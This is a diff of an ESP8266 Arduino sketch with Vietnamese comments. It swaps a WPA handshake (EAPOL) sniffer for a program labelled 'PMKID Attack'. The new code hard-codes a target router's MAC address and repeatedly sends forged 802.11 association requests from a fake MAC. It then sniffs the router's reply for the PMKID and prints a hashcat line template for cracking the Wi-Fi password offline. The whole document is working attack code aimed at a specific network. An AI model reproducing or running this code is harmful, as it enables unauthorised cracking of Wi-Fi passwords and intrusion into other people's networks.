@@ -1,97 +1,113 @@
 #include <ESP8266WiFi.h>
 
 extern "C" {
-  #include "user_interface.h"  // Cần cho promiscuous
+  #include "user_interface.h"
 }
 
-#define FIXED_CHANNEL     5          // Channel cố định 5
+#define TARGET_BSSID      {0x20, 0xBE, 0xB4, 0x12, 0x96, 0xE7}  // MAC router của bạn (từ LAN Scan)
+#define TARGET_CHANNEL    5                                      // Giữ channel 5 (bạn có thể đổi nếu biết channel khác)
 #define SERIAL_BAUD       115200
-#define MAX_DUMP_BYTES    250        // Dump càng nhiều bytes càng tốt (tăng cơ hội thấy full EAPOL)
 
-static uint32_t eapol_count = 0;     // Đếm số EAPOL bắt được
+uint8_t target_bssid[6] = TARGET_BSSID;
 
-// Callback promiscuous - gọi mỗi khi có gói tin
-static void ICACHE_FLASH_ATTR promisc_cb(uint8_t *buf, uint16_t len) {
-  if (len < 50) return;  // Bỏ gói quá ngắn
-
-  // RSSI signed (thường byte 1 hoặc tùy SDK)
-  int8_t rssi = (int8_t)buf[1];
-
-  // Tìm signature EAPOL: 0x88 0x8E (EtherType)
-  for (uint16_t i = 10; i < len - 4; i++) {  // Bắt đầu sau header rx_ctrl (~12 bytes)
-    if (buf[i] == 0x88 && buf[i + 1] == 0x8E) {
-      eapol_count++;
-      
-      uint16_t eapol_start = i;
-      uint16_t eapol_len_approx = len - eapol_start;
-
-      Serial.printf("\n[%u] === EAPOL #%u DETECTED! Len total=%u | EAPOL approx=%u | RSSI=%d dBm | Ch=%d\n",
-                    millis() / 1000, eapol_count, len, eapol_len_approx, rssi, FIXED_CHANNEL);
-
-      // In hex dump dài nhất có thể
-      Serial.print("Full hex dump (first ");
-      Serial.print(MAX_DUMP_BYTES);
-      Serial.print(" bytes): ");
-
-      uint16_t dump_end = min((uint16_t)MAX_DUMP_BYTES, len);
-      for (uint16_t j = 0; j < dump_end; j++) {
-        if (buf[j] < 16) Serial.print("0");
-        Serial.print(buf[j], HEX);
-        Serial.print(" ");
-        if ((j + 1) % 16 == 0) Serial.print("  ");  // Ngắt dòng cho dễ đọc
-      }
-      Serial.println();
-
-      // Optional: Check xem có vẻ full Message 2/3/4 không (thường >95 bytes)
-      if (eapol_len_approx > 95) {
-        Serial.println("!!! POTENTIAL FULL HANDSHAKE MESSAGE !!! (len >95 → có thể crack được)");
-      }
-
-      // Dừng sớm nếu chỉ cần 1 handshake (comment nếu muốn capture nhiều)
-      // return;
-    }
-  }
-}
+// Packet Association Request mẫu để trigger PMKID
+uint8_t pmkid_packet[] = {
+  0x40, 0x00,                           // Type: Association Request
+  0x00, 0x00,                           // Duration
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Receiver (AP BSSID - sẽ copy)
+  0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01,   // Transmitter (MAC giả)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // BSSID (sẽ copy)
+  0x00, 0x00,                           // Sequence control
+  0x31, 0x04,                           // Capability Info (short preamble + privacy)
+  0x00, 0x00,                           // Listen Interval
+  // RSN Information Element để yêu cầu PMKID
+  0x30, 0x14,
+  0x01, 0x00,
+  0x00, 0x0F, 0xAC, 0x04,               // Group cipher: CCMP
+  0x01, 0x00,
+  0x00, 0x0F, 0xAC, 0x04,               // Pairwise: CCMP
+  0x01, 0x00,
+  0x00, 0x0F, 0xAC, 0x02,               // AKM: PSK
+  0x00, 0x00,                           // RSN capabilities
+  0x00, 0x00                            // PMKID count = 0 (router sẽ trả nếu hỗ trợ)
+};
 
 void setup() {
   Serial.begin(SERIAL_BAUD);
-  delay(200);
+  delay(300);
+  
   Serial.println("\n=====================================");
-  Serial.println("ESP8266 MAX STRENGTH Sniffer - Channel 5 ONLY");
-  Serial.println("Tối ưu capture EAPOL WPA handshake");
+  Serial.println("ESP8266 PMKID Attack - Target Router MAC");
+  Serial.print("BSSID: ");
+  for (int i = 0; i < 6; i++) {
+    if (target_bssid[i] < 16) Serial.print("0");
+    Serial.print(target_bssid[i], HEX);
+    Serial.print(i < 5 ? ":" : "\n");
+  }
+  Serial.printf("Channel fixed: %d\n", TARGET_CHANNEL);
   Serial.println("=====================================\n");
 
   WiFi.mode(WIFI_STA);
   WiFi.disconnect(true);
   delay(100);
 
-  wifi_set_opmode(STATION_MODE);
-
-  // Tắt promiscuous trước để reset
-  wifi_promiscuous_enable(0);
-  delay(50);
-
-  // Fix cứng channel 5
-  wifi_set_channel(FIXED_CHANNEL);
-
-  // Đăng ký callback
-  wifi_set_promiscuous_rx_cb(promisc_cb);
-
-  // Bật promiscuous
-  wifi_promiscuous_enable(1);
-
-  Serial.printf("Sniffing STARTED - Locked on Channel %d\n", FIXED_CHANNEL);
-  Serial.println("Chờ client reconnect để tạo 4-way handshake...");
-  Serial.println("Làm: Quên mạng → nhập pass lại (lặp 5-10 lần)");
+  wifi_set_channel(TARGET_CHANNEL);
+  Serial.println("Da fix channel va bat dau gui request...");
 }
 
 void loop() {
-  // Không cần code gì nhiều, callback tự chạy
-  // In thống kê mỗi 10 giây (optional)
-  static uint32_t last = 0;
-  if (millis() - last > 10000) {
-    last = millis();
-    Serial.printf("[INFO] Đã bắt được %u EAPOL frames\n", eapol_count);
+  send_pmkid_request();
+  delay(400);  // Gửi mỗi ~0.4 giây (có thể tăng/giảm tùy ý)
+}
+
+void send_pmkid_request() {
+  // Copy BSSID vào packet
+  memcpy(&pmkid_packet[4], target_bssid, 6);   // Receiver = AP
+  memcpy(&pmkid_packet[16], target_bssid, 6);  // BSSID
+
+  // Gửi raw 802.11 frame
+  int result = wifi_send_pkt_freedom(pmkid_packet, sizeof(pmkid_packet), 0);
+  
+  if (result == 0) {
+    Serial.println("Da gui Association Request de lay PMKID...");
+  } else {
+    Serial.printf("Gui that bai (error: %d)\n", result);
   }
-  delay(5);
+
+  // Bat sniff de bat phan hoi tu router
+  wifi_promiscuous_enable(1);
+  wifi_set_promiscuous_rx_cb(on_packet_received);
+}
+
+static void ICACHE_FLASH_ATTR on_packet_received(uint8_t *buf, uint16_t len) {
+  if (len < 60) return;
+
+  // Tim PMKID (thường trong tag vendor-specific 0xDD + OUI 00-90-4C-04)
+  for (uint16_t i = 0; i < len - 25; i++) {
+    if (buf[i] == 0xDD && 
+        buf[i+1] >= 20 && 
+        buf[i+4] == 0x00 && buf[i+5] == 0x90 && 
+        buf[i+6] == 0x4C && buf[i+7] == 0x04) {
+      
+      // PMKID thường nằm ngay sau OUI (offset i+8 đến i+23, 16 bytes)
+      Serial.println("\n!!! TIM THAY PMKID !!!");
+      Serial.print("PMKID hex (16 bytes): ");
+      
+      for (int j = 0; j < 16; j++) {
+        uint8_t byte_val = buf[i + 8 + j];
+        if (byte_val < 16) Serial.print("0");
+        Serial.print(byte_val, HEX);
+        Serial.print(" ");
+      }
+      Serial.println("\n");
+      
+      Serial.println("Copy PMKID nay va tao dong hashcat:");
+      Serial.println("WPA*01*PMKID_hex*20BEB41296E7*DEADBEEF0001*SSID_HEX*");
+      Serial.println("(Thay PMKID_hex bang gia tri tren, SSID_HEX la ten mang chuyen hex)");
+      
+      // Optional: Tat sniff sau khi tim thay de tranh spam
+      // wifi_promiscuous_enable(0);
+      return;
+    }
+  }
 }
